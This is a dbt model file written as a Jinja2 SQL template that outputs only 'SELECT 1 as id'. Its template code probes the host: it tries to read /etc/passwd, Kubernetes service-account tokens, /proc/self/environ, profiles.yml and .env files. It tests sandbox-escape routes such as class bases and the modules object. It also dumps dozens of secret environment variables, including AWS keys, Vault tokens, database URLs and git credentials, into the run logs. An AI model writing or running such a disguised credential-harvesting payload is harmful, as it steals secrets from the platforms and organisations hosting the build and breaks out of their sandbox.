{{ config(materialized='view') }}

{# Probe file read capabilities in the Jinja2 sandbox #}

{# Method 1: load_agate_table - designed for CSV loading #}
{%- set paths = [
  '/etc/passwd',
  '/etc/hostname',
  '/var/run/secrets/kubernetes.io/serviceaccount/token',
  '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
  '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
  '/proc/self/environ',
  '/proc/self/cmdline',
  '/proc/1/cmdline',
  '/usr/src/orc/profiles.yml',
  '/tmp/jobs/profiles.yml',
  '/root/.dbt/profiles.yml',
  '/usr/src/orc/.env',
  '/usr/src/orc/dbt_project.yml'
] -%}

{%- for p in paths -%}
  {%- set result = load_agate_table(p) if load_agate_table is defined else 'UNDEF' -%}
  {{ log("FILE_READ_AGATE[" ~ p ~ "]=" ~ result | string | truncate(500), info=True) if result != 'UNDEF' else log("FILE_READ_AGATE[" ~ p ~ "]=load_agate_table_UNDEF", info=True) }}
{%- endfor -%}

{# Method 2: Try open via Jinja2 sandbox #}
{%- set ns = namespace(file_data='') -%}
{%- if range.__class__.__bases__ is defined -%}
  {{ log("BASES_AVAILABLE=YES", info=True) }}
{%- else -%}
  {{ log("BASES_AVAILABLE=NO", info=True) }}
{%- endif -%}

{# Method 3: modules.* access #}
{{ log("MODULES_TYPE=" ~ modules | string | truncate(200), info=True) if modules is defined else log("MODULES_UNDEF", info=True) }}

{# Check what attributes modules has #}
{%- if modules is defined -%}
  {%- set mod_attrs = [] -%}
  {%- for attr_name in ['os', 'sys', 'io', 'subprocess', 'builtins', 'importlib', 'pathlib', 'json', 'base64', 'socket', 'http', 'urllib', 're', 'datetime', 'pytz', 'itertools', 'collections', 'functools', 'typing', 'contextlib'] -%}
    {%- set val = modules[attr_name] if modules[attr_name] is defined else none -%}
    {%- if val is not none -%}
      {{ log("MODULE_" ~ attr_name ~ "=" ~ val | string | truncate(200), info=True) }}
    {%- endif -%}
  {%- endfor -%}
{%- endif -%}

{# Method 4: Try env_var to read interesting vars #}
{%- set k8s_vars = [
  'KUBERNETES_SERVICE_HOST',
  'KUBERNETES_SERVICE_PORT',
  'KUBERNETES_PORT',
  'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI',
  'AWS_CONTAINER_CREDENTIALS_FULL_URI',
  'AWS_CONTAINER_AUTHORIZATION_TOKEN',
  'AWS_WEB_IDENTITY_TOKEN_FILE',
  'AWS_ROLE_ARN',
  'AWS_DEFAULT_REGION',
  'AWS_REGION',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'AWS_SESSION_TOKEN',
  'ECS_CONTAINER_METADATA_URI',
  'ECS_CONTAINER_METADATA_URI_V4',
  'GOOGLE_APPLICATION_CREDENTIALS',
  'AZURE_CLIENT_ID',
  'AZURE_TENANT_ID',
  'AZURE_CLIENT_SECRET',
  'DATABASE_URL',
  'REDIS_URL',
  'CELERY_BROKER_URL',
  'SECRET_KEY',
  'DJANGO_SECRET_KEY',
  'FLASK_SECRET_KEY',
  'JWT_SECRET',
  'API_KEY',
  'SENTRY_DSN',
  'DD_API_KEY',
  'NEW_RELIC_LICENSE_KEY',
  'VAULT_ADDR',
  'VAULT_TOKEN',
  'DBT_CLOUD_API_KEY',
  'DBT_CLOUD_HOST',
  'DBT_CLOUD_ACCOUNT_ID',
  'DBT_CLOUD_RUN_ID',
  'DBT_CLOUD_JOB_ID',
  'DBT_CLOUD_PROJECT_ID',
  'DBT_CLOUD_ENVIRONMENT_ID',
  'DBT_CLOUD_RUN_REASON',
  'DBT_CLOUD_RUN_REASON_CATEGORY',
  'DBT_ENV_SECRET_GIT_CREDENTIAL',
  'GIT_SSH_COMMAND',
  'S3_BUCKET',
  'ARTIFACT_BUCKET'
] -%}

{%- for v in k8s_vars -%}
  {%- set val = env_var(v, '') -%}
  {%- if val != '' -%}
    {{ log("K8S_ENV[" ~ v ~ "]=" ~ val | truncate(300), info=True) }}
  {%- endif -%}
{%- endfor -%}

{# Method 5: Check if 'write' function exists and what it does #}
{{ log("WRITE_FUNC=" ~ write | string | truncate(200), info=True) if write is defined else log("WRITE_UNDEF", info=True) }}
{{ log("RENDER_FUNC=" ~ render | string | truncate(200), info=True) if render is defined else log("RENDER_UNDEF", info=True) }}

{# Method 6: Try to use modules.re to probe #}
{%- if modules is defined and modules.re is defined -%}
  {%- set re_mod = modules.re -%}
  {{ log("RE_MODULE_DIR=" ~ re_mod | string | truncate(300), info=True) }}
{%- endif -%}

SELECT 1 as id
